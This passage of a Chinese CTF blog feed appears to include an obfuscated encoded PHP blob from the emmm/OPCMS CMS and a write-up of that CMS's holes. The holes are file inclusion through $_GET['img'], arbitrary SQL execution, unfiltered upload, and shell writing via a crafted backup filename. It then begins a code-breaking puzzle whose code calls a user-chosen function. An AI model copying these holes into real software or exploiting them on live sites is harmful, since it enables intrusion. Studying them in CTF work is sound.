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&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$oyo_locking</span>))&#123;</span><br><span class="line">    <span class="variable">$key</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$Encodeurl</span>.<span class="string">&quot;function/font/8ba4c3c5dbdfcf9c2d726fe11f1fa8d6.txt&quot;</span>);</span><br><span class="line">    <span class="variable">$key</span>=<span class="title function_ invoke__">trim</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>!=<span class="string">&quot;8ba4c3c5dbdfcf9c2d726fe11f1fa8d6&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;a style=\&quot;color:red;font-size:14px\&quot;&gt;错误：密匙破坏&lt;/a&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$oyo_locking</span>=<span class="string">&quot;passed&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">emmmmd5</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$emmm_O0O0o00o0</span>,<span class="variable">$emmm</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$emmm_O0O0o00o0</span>))&#123;</span><br><span class="line">        <span class="variable">$empower</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;empowerlogin&#x27;</span> =&gt; <span class="string">&#x27;Powered by &lt;a href=&quot;http://www.emmm.net&quot; target=&quot;_blank&quot;&gt;emmm!&lt;/a&gt;  (c)  &#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y&#x27;</span>).<span class="string">&#x27;,  哈尔滨伟成科技有限公司&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;empower&#x27;</span> =&gt; <span class="string">&#x27;&lt;div style=&quot;float:right; line-height:30px; padding-right:20px;&quot;&gt;Powered by &lt;a href=&quot;http://www.emmm.net&quot; target=&quot;_blank&quot;&gt;emmm!&lt;/a&gt;&lt;/div&gt;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;empowerbz&#x27;</span> =&gt; <span class="string">&#x27;&lt;li&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$emmm</span>[<span class="string">&#x27;adminpath&#x27;</span>].<span class="string">&#x27;/emmm_opcms.php&quot; target=&quot;main&quot;&gt;&lt;font color=&quot;#FF0000&quot;&gt;软件授权&lt;/font&gt;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://www.emmm.net&quot; target=&quot;_blank&quot;&gt;官方网站&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://www.emmm.net/club&quot; target=&quot;_blank&quot;&gt;技术论坛&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://emmm.net/club/forum.php?mod=forumdisplay&amp;fid=36&quot; target=&quot;_blank&quot;&gt;模板下载&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://emmm.net/club/forum.php?mod=forumdisplay&amp;fid=37&quot; target=&quot;_blank&quot;&gt;插件下载&lt;/a&gt;&lt;/li&gt;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;empowerright&#x27;</span>=&gt;<span class="string">&#x27;&lt;div style=&quot;clear:both;height:50px&quot;&gt;&lt;/div&gt;&lt;div class=&quot;emmm_data3&quot;&gt;&lt;h1&gt;版权信息 (购买授权版，此信息将不在显示。)&lt;/h1&gt;&lt;div style=&quot;clear:both&quot;&gt;&lt;/div&gt;&lt;table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;10&quot;&gt;&lt;tr&gt;&lt;td width=&quot;46%&quot; style=&quot;border-right:1px #CCC solid&quot;&gt;&lt;table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;5&quot;&gt;&lt;tr&gt;&lt;td&gt;&lt;div align=&quot;right&quot;&gt;软件开发：&lt;/div&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;http://www.emmm.net&quot; target=&quot;_blank&quot;&gt;哈尔滨伟成科技有限公司&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;div align=&quot;right&quot;&gt;软件名称：&lt;/div&gt;&lt;/td&gt;&lt;td&gt;emmm&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;div align=&quot;right&quot;&gt;软件其它常用名称：&lt;/div&gt;&lt;/td&gt;&lt;td&gt;傲派、傲派CMS、OPCMS&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;div align=&quot;right&quot;&gt;专利证书：&lt;/div&gt;&lt;/td&gt;&lt;td&gt;2015SR078193    &lt;a href=&quot;javascript:dialog()&quot;&gt;[查看]&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;div align=&quot;right&quot;&gt;项目负责人：&lt;/div&gt;&lt;/td&gt;&lt;td&gt;唐晓伟&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;div align=&quot;right&quot;&gt;开发团队成员：&lt;/div&gt;&lt;/td&gt;&lt;td&gt;大鹏、超超、小娟&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;div align=&quot;right&quot;&gt;相关链接：&lt;/div&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;http://emmm.net/club/forum.php?mod=forumdisplay&amp;fid=2&quot; target=&quot;_blank&quot;&gt;问题反馈&lt;/a&gt; - &lt;a href=&quot;http://emmm.net/club/forum.php?mod=forumdisplay&amp;fid=36&quot; target=&quot;_blank&quot;&gt;模板下载&lt;/a&gt; - &lt;a href=&quot;http://emmm.net/club/forum.php?mod=forumdisplay&amp;fid=37&quot; target=&quot;_blank&quot;&gt;插件下载&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;&lt;td width=&quot;54%&quot; valign=&quot;top&quot;&gt;&lt;style type=&quot;text/css&quot;&gt;.module ul li&#123;height:22px;line-height:22px;color:#CCC&#125;.module ul li a&#123;color:#333&#125;&lt;/style&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.emmm.net/club/api.php?mod=js&amp;bid=5&quot;&gt;&lt;/script&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&#x27;</span>,</span><br><span class="line">        );</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$emmm_O0O0o00o0</span> == <span class="string">&quot;95d4f8af44&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$empower</span> = <span class="keyword">array</span>(<span class="string">&#x27;empowerlogin&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;empower&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;empowerbz&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;empowerright&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$empower</span> = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;empowerlogin&#x27;</span> =&gt; <span class="string">&#x27;&lt;div id=&quot;Copyright&quot;&gt;Powered by &lt;a href=&quot;http://www.emmm.net&quot; target=&quot;_blank&quot;&gt;emmm!&lt;/a&gt;  (c)  &#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y&#x27;</span>).<span class="string">&#x27;,  哈尔滨伟成科技有限公司&lt;/div&gt;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;empower&#x27;</span> =&gt; <span class="string">&#x27;&lt;div style=&quot;float:right; line-height:30px; padding-right:20px;&quot;&gt;Powered by &lt;a href=&quot;http://www.emmm.net&quot; target=&quot;_blank&quot;&gt;emmm!&lt;/a&gt;&lt;/div&gt;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;empowerbz&#x27;</span> =&gt; <span class="string">&#x27;&lt;li&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$emmm</span>[<span class="string">&#x27;adminpath&#x27;</span>].<span class="string">&#x27;/emmm_opcms.php&quot; target=&quot;main&quot;&gt;&lt;font color=&quot;#FF0000&quot;&gt;软件授权&lt;/font&gt;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://www.emmm.net&quot; target=&quot;_blank&quot;&gt;官方网站&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://www.emmm.net/club&quot; target=&quot;_blank&quot;&gt;技术论坛&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://emmm.net/club/forum.php?mod=forumdisplay&amp;fid=36&quot; target=&quot;_blank&quot;&gt;模板下载&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://emmm.net/club/forum.php?mod=forumdisplay&amp;fid=37&quot; target=&quot;_blank&quot;&gt;插件下载&lt;/a&gt;&lt;/li&gt;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;empowerright&#x27;</span>=&gt;<span class="string">&#x27;&lt;div style=&quot;clear:both;height:50px&quot;&gt;&lt;/div&gt;&lt;div class=&quot;emmm_data3&quot;&gt;&lt;h1&gt;版权信息 (购买授权版，此信息将不在显示。)&lt;/h1&gt;&lt;div style=&quot;clear:both&quot;&gt;&lt;/div&gt;&lt;table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;10&quot;&gt;&lt;tr&gt;&lt;td width=&quot;46%&quot; style=&quot;border-right:1px #CCC solid&quot;&gt;&lt;table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;5&quot;&gt;&lt;tr&gt;&lt;td&gt;&lt;div align=&quot;right&quot;&gt;软件开发：&lt;/div&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;http://www.emmm.net&quot; target=&quot;_blank&quot;&gt;哈尔滨伟成科技有限公司&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;div align=&quot;right&quot;&gt;软件名称：&lt;/div&gt;&lt;/td&gt;&lt;td&gt;emmm&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;div align=&quot;right&quot;&gt;软件其它常用名称：&lt;/div&gt;&lt;/td&gt;&lt;td&gt;傲派、傲派CMS、OPCMS&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;div align=&quot;right&quot;&gt;专利证书：&lt;/div&gt;&lt;/td&gt;&lt;td&gt;2015SR078193    &lt;a href=&quot;javascript:dialog()&quot;&gt;[查看]&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;div align=&quot;right&quot;&gt;项目负责人：&lt;/div&gt;&lt;/td&gt;&lt;td&gt;唐晓伟&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;div align=&quot;right&quot;&gt;开发团队成员：&lt;/div&gt;&lt;/td&gt;&lt;td&gt;大鹏、超超、小娟&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;div align=&quot;right&quot;&gt;相关链接：&lt;/div&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;http://emmm.net/club/forum.php?mod=forumdisplay&amp;fid=2&quot; target=&quot;_blank&quot;&gt;问题反馈&lt;/a&gt; - &lt;a href=&quot;http://emmm.net/club/forum.php?mod=forumdisplay&amp;fid=36&quot; target=&quot;_blank&quot;&gt;模板下载&lt;/a&gt; - &lt;a href=&quot;http://emmm.net/club/forum.php?mod=forumdisplay&amp;fid=37&quot; target=&quot;_blank&quot;&gt;插件下载&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;&lt;td width=&quot;54%&quot; valign=&quot;top&quot;&gt;&lt;style type=&quot;text/css&quot;&gt;.module ul li&#123;height:22px;line-height:22px;color:#CCC&#125;.module ul li a&#123;color:#333&#125;&lt;/style&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.emmm.net/club/api.php?mod=js&amp;bid=5&quot;&gt;&lt;/script&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&#x27;</span>,</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$empower</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="文件包含">文件包含</h2><p>这个是抓流量发现的洞,看到client/user/index.php的253行任意文件包含</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>全局搜索<code>$_GET['img']</code> <a href="/images/2018/12/2018-12-17-15-35-53-创建的截图.png"><img src="/images/2018/12/2018-12-17-15-35-53-创建的截图.png" /></a> 发现只有这有这个变量,对全局没有影响,直接删除掉即可</p><h2 id="任意sql执行">任意sql执行</h2><p>做到这里感觉差不多了,于是想登录去后台看下,用主办方的密码登录,发现登录失败(因为密码很复杂,类似于ssh的密码,所以没考虑被修改) 这里因为后台存在一个操作数据库的功能,而且并没有做权限控制,所以这里存在搅shi现象,可以疯狂修改你的admin密码让你挂掉check,当然,你也可以选择在数据库拿到flag 分析一下代码 过了口令之后</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;sql&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;;&#x27;</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$sql</span> <span class="keyword">as</span> <span class="variable">$op</span>)&#123;</span><br><span class="line">        <span class="variable">$query</span> = <span class="variable">$db</span> -&gt; <span class="title function_ invoke__">create</span>(<span class="variable">$op</span>,<span class="number">2</span>);  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>而<code>$db-&gt;create</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">create</span>(<span class="params"><span class="variable">$o</span> = <span class="string">&#x27;&#x27;</span>,<span class="variable">$u</span> = <span class="number">1</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$u</span> == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="variable">$Query</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;create table &quot;</span>.<span class="variable">$o</span>);</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(<span class="variable">$u</span> == <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="variable">$Query</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$o</span>,<span class="variable">$this</span> -&gt; conn);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$Query</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然,任意sql语句执行,第一天线下没经验,没注意审后台,导致被别人直接删库了,而我们库又没有备份... 然后用web根目录的sql文件重装数据库,发现数据库文件是错的 一是admin的密码就是admin 二是emmm_user少了一个列,导致后面user注册疯狂出错... 晚上回去之后想到可以重装一下cms然后把库导出第二天再导入,但是第二天主办方把库权限改了...没有权限去改错的那个表... 再后来去联系主办方让加上了...终于第一次不挂check了 不过好了一轮第二轮又down了,很奇怪,因为所有的部分都没有出问题...</p><h2 id="filebox任意文件上传">filebox任意文件上传</h2><p>filebox中没有做权限管理,也没有做上传过滤,因此可以导致任意用户任意文件上传 <a href="/images/2018/12/2018-12-19-12-02-47-创建的截图.png"><img src="/images/2018/12/2018-12-19-12-02-47-创建的截图.png" /></a> <a href="/images/2018/12/2018-12-19-12-03-52-创建的截图.png"><img src="/images/2018/12/2018-12-19-12-03-52-创建的截图.png" /></a> filebox中利用点应该还有其他的...这里只举出一个例子</p><h2 id="备份写shell">备份写shell</h2><p>看到<code>bakgo.php</code>中的一段代码 <a href="/images/2018/12/2018-12-19-12-12-01-创建的截图.png"><img src="/images/2018/12/2018-12-19-12-12-01-创建的截图.png" /></a> writefile函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writefile</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$method</span> = <span class="string">&#x27;w&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$fsqlzip</span>, <span class="variable">$_POST</span>;;</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&quot;<span class="subst">&#123;$_POST[filename]&#125;</span>_pg<span class="subst">&#123;$_POST[page]&#125;</span>.php&quot;</span>;</span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;<span class="subst">$_POST</span>[dir]/<span class="subst">$file</span>&quot;</span>, <span class="string">&quot;<span class="subst">$method</span>&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然可以通过构造filename造成文件写入 <a href="/images/2018/12/2018-12-19-12-44-53-创建的截图.png"><img src="/images/2018/12/2018-12-19-12-44-53-创建的截图-1024x329.png" /></a> 然后拿到shell,虽然会一直刷新,但直接用curl就ok <a href="/images/2018/12/2018-12-19-12-46-30-创建的截图.png"><img src="/images/2018/12/2018-12-19-12-46-30-创建的截图.png" /></a> 后面的引导文件内容应该也可以写shell,这里我没看就不写了 大概web1审出来的就这些了,修洞的话只用加一个权限管理就好,设置非admin无法使用这些manage的业务 <a href="/images/2018/12/2018-12-19-12-51-02-创建的截图.png"><img src="/images/2018/12/2018-12-19-12-51-02-创建的截图.png" /></a> 不过设置好了这个也还是可以让别人downcheck的,比如疯狂访问别人的数据库重置文件,而数据库重置文件中的admin密码是错误的,而且这里没有权限控制模块,所以就导致downcheck. 后来想了想可以改一下数据库备份的配置,或者强行加身份认证模块....不过都是赛后的事了</p><h1 id="第二天的题">第二天的题</h1><p>mvc框架的cms 一上来打包www让队友d盾扫一下,发现一句话 删掉一句话然后手动打一波交一下flag 然后居然还拿到一血了2333 后续好像有队挖到读文件的洞了,不过没怎么看,打到后面有点累了不怎么想打了,后续有时间在看看这个mvc 最后一波掉分掉到第7,tcl ORZ</p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ph师傅的代码审计星球</title>
      <link href="/2018/11/30/easyfunction%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/"/>
      <url>/2018/11/30/easyfunction%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>之前看到ph师傅代码审计星球的广告,看了第一道题就觉得蛮有意思的,于是就入了一波2333,简单记录一下自己能做的或是找到wp学习的题目..顺手推广一下.. 链接:<a href="https://code-breaking.com/puzzle/1/" title="https://code-breaking.com/puzzle/1/">https://code-breaking.com/puzzle/1/</a></p><h1 id="easy---function">easy - function</h1><h2 id="源码">源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$arg</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>, <span class="variable">$action</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$action</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 